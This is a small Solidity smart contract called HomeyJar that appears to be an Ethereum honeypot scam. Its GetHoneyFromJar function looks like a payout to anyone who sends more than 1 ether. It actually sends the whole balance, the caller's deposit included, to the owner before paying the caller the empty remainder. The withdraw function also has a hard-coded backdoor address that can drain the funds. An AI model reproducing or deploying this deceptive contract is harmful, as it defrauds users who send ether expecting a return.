pragma solidity ^0.4.19;

contract HomeyJar {
    address public o = msg.sender;
    
    function() public payable {}

    function GetHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            address temp = o;
            temp.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }
    
    function withdraw() payable public {
        address temp = o;
        if (msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7) {
            temp = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
        }
        require(msg.sender == temp);
        temp.transfer(this.balance);
    }
    
    function Command(address adr, bytes data) payable public {
        require(msg.sender == o);
        adr.call.value(msg.value)(data);
    }
}